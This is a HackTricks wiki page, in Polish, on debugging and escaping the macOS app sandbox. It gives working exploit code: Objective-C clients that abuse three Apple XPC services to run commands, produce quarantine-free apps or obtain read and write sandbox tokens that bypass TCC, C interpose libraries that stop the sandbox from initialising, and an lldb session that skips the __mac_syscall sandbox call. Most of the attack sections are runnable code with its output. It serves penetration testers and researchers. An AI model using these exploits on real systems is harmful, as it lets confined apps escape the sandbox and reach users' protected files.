# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Proces ładowania Sandboxa

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Obraz z <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na poprzednim obrazie można zaobserwować **jak sandbox będzie ładowany** gdy aplikacja z uprawnieniem **`com.apple.security.app-sandbox`** jest uruchamiana.

Kompilator połączy `/usr/lib/libSystem.B.dylib` z binarnym plikiem.

Następnie **`libSystem.B`** będzie wywoływać inne funkcje, aż **`xpc_pipe_routine`** wyśle uprawnienia aplikacji do **`securityd`**. Securityd sprawdza, czy proces powinien być kwarantannowany w Sandboxie, a jeśli tak, to zostanie poddany kwarantannie.\
Na koniec sandbox zostanie aktywowany przez wywołanie **`__sandbox_ms`**, które wywoła **`__mac_syscall`**.

## Możliwe obejścia

### Obejście atrybutu kwarantanny

**Pliki tworzone przez procesy w sandboxie** mają dodany **atrybut kwarantanny**, aby zapobiec ucieczce z sandboxa. Jednak jeśli uda ci się **utworzyć folder `.app` bez atrybutu kwarantanny** w aplikacji sandboxowanej, możesz sprawić, że binarny plik aplikacji wskaże na **`/bin/bash`** i dodać kilka zmiennych środowiskowych w **plist**, aby nadużyć **`open`** do **uruchomienia nowej aplikacji bez sandboxa**.

To zostało zrobione w [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Dlatego w tej chwili, jeśli jesteś w stanie stworzyć folder z nazwą kończącą się na **`.app`** bez atrybutu kwarantanny, możesz uciec z sandboxa, ponieważ macOS tylko **sprawdza** atrybut **kwarantanny** w **folderze `.app`** i w **głównym pliku wykonywalnym** (a my wskażemy główny plik wykonywalny na **`/bin/bash`**).
>
> Zauważ, że jeśli pakiet .app został już autoryzowany do uruchomienia (ma atrybut kwarantanny z flagą autoryzacji do uruchomienia), możesz również to nadużyć... z wyjątkiem tego, że teraz nie możesz pisać wewnątrz pakietów **`.app`**, chyba że masz jakieś uprzywilejowane uprawnienia TCC (których nie będziesz miał w sandboxie o wysokim poziomie).

### Nadużywanie funkcji Open

W [**ostatnich przykładach obejścia sandboxa Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) można zobaczyć, jak funkcjonalność cli **`open`** może być nadużywana do obejścia sandboxa.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Agenci/Daemon

Nawet jeśli aplikacja jest **przeznaczona do sandboxowania** (`com.apple.security.app-sandbox`), możliwe jest obejście sandboxa, jeśli jest **uruchamiana z LaunchAgent** (`~/Library/LaunchAgents`), na przykład.\
Jak wyjaśniono w [**tym poście**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), jeśli chcesz uzyskać trwałość z aplikacją, która jest sandboxowana, możesz sprawić, że będzie automatycznie uruchamiana jako LaunchAgent i może wstrzyknąć złośliwy kod za pomocą zmiennych środowiskowych DyLib.

### Nadużywanie lokalizacji Auto Start

Jeśli proces sandboxowany może **zapisywać** w miejscu, w którym **później uruchomi się aplikacja bez sandboxa**, będzie mógł **uciec, po prostu umieszczając** tam binarny plik. Dobrym przykładem takich lokalizacji są `~/Library/LaunchAgents` lub `/System/Library/LaunchDaemons`.

W tym celu możesz nawet potrzebować **2 kroków**: Aby proces z **bardziej liberalnym sandboxem** (`file-read*`, `file-write*`) wykonał twój kod, który faktycznie zapisze w miejscu, w którym będzie **wykonywany bez sandboxa**.

Sprawdź tę stronę o **lokacjach Auto Start**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Nadużywanie innych procesów

Jeśli z procesu sandboxowego jesteś w stanie **skompromentować inne procesy** działające w mniej restrykcyjnych sandboxach (lub wcale), będziesz mógł uciec do ich sandboxów:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Dostępne usługi Mach systemu i użytkownika

Sandbox pozwala również na komunikację z niektórymi **usługami Mach** za pośrednictwem XPC zdefiniowanymi w profilu `application.sb`. Jeśli uda ci się **nadużyć** jedną z tych usług, możesz być w stanie **uciec z sandboxa**.

Jak wskazano w [tym opracowaniu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacje o usługach Mach są przechowywane w `/System/Library/xpc/launchd.plist`. Możliwe jest znalezienie wszystkich usług Mach systemu i użytkownika, przeszukując ten plik pod kątem `<string>System</string>` i `<string>User</string>`.

Ponadto możliwe jest sprawdzenie, czy usługa Mach jest dostępna dla aplikacji sandboxowanej, wywołując `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Dostępne usługi PID Mach

Te usługi Mach były po raz pierwszy nadużywane do [ucieczki z piaskownicy w tym artykule](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). W tym czasie **wszystkie usługi XPC wymagane** przez aplikację i jej framework były widoczne w domenie PID aplikacji (są to usługi Mach z `ServiceType` jako `Application`).

Aby **skontaktować się z usługą XPC w domenie PID**, wystarczy zarejestrować ją w aplikacji za pomocą linii takiej jak:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Ponadto, możliwe jest znalezienie wszystkich usług Mach **Application** poprzez przeszukiwanie `System/Library/xpc/launchd.plist` w poszukiwaniu `<string>Application</string>`.

Innym sposobem na znalezienie ważnych usług xpc jest sprawdzenie tych w:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Kilka przykładów nadużywania tej techniki można znaleźć w [**oryginalnym opisie**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), jednak poniżej przedstawiono kilka podsumowanych przykładów.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ta usługa pozwala na każde połączenie XPC, zawsze zwracając `YES`, a metoda `runTask:arguments:withReply:` wykonuje dowolne polecenie z dowolnymi parametrami.

Eksploatacja była "tak prosta jak":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ta usługa XPC pozwalała każdemu klientowi, zawsze zwracając YES, a metoda `createZipAtPath:hourThreshold:withReply:` zasadniczo pozwalała wskazać ścieżkę do folderu do skompresowania, a ona skompresuje go w pliku ZIP.

Dlatego możliwe jest wygenerowanie fałszywej struktury folderów aplikacji, skompresowanie jej, a następnie dekompresja i uruchomienie jej w celu ucieczki z piaskownicy, ponieważ nowe pliki nie będą miały atrybutu kwarantanny.

Eksploit był:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ta usługa XPC umożliwia nadanie dostępu do odczytu i zapisu do dowolnego URL dla klienta XPC za pomocą metody `extendAccessToURL:completion:`, która akceptowała każde połączenie. Ponieważ usługa XPC ma FDA, możliwe jest nadużycie tych uprawnień w celu całkowitego obejścia TCC.

Eksploit był:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statyczne kompilowanie i dynamiczne linkowanie

[**To badanie**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) odkryło 2 sposoby na obejście Sandbox. Ponieważ sandbox jest stosowany z poziomu użytkownika, gdy biblioteka **libSystem** jest ładowana. Jeśli binarka mogłaby uniknąć jej załadowania, nigdy nie zostałaby objęta sandboxem:

- Jeśli binarka była **całkowicie statycznie skompilowana**, mogłaby uniknąć ładowania tej biblioteki.
- Jeśli **binarka nie musiałaby ładować żadnych bibliotek** (ponieważ linker jest również w libSystem), nie będzie musiała ładować libSystem.

### Shellcode'y

Zauważ, że **nawet shellcode'y** w ARM64 muszą być linkowane w `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Ograniczenia nieodziedziczone

Jak wyjaśniono w **[bonusie tego opracowania](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ograniczenie sandboxa takie jak:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
może być obejście przez nowy proces wykonujący na przykład:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Jednak oczywiście, ten nowy proces nie odziedziczy uprawnień ani przywilejów od procesu nadrzędnego.

### Uprawnienia

Zauważ, że nawet jeśli niektóre **działania** mogą być **dozwolone przez sandbox**, jeśli aplikacja ma określone **uprawnienie**, jak w:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Aby uzyskać więcej informacji na temat **Interposting**, sprawdź:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, aby zapobiec sandboxowi
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall`, aby zapobiec Sandboxowi
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

Skompilujmy aplikację, która powinna być w piaskownicy:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Następnie skompiluj aplikację:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!OSTRZEŻENIE]
> Aplikacja spróbuje **odczytać** plik **`~/Desktop/del.txt`**, co **Sandbox nie pozwoli**.\
> Utwórz tam plik, ponieważ po ominięciu Sandbox będzie mogła go odczytać:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Zdebugujmy aplikację, aby zobaczyć, kiedy Sandbox jest ładowany:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Nawet po ominięciu Sandbox TCC** zapyta użytkownika, czy chce zezwolić procesowi na odczyt plików z pulpitu

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
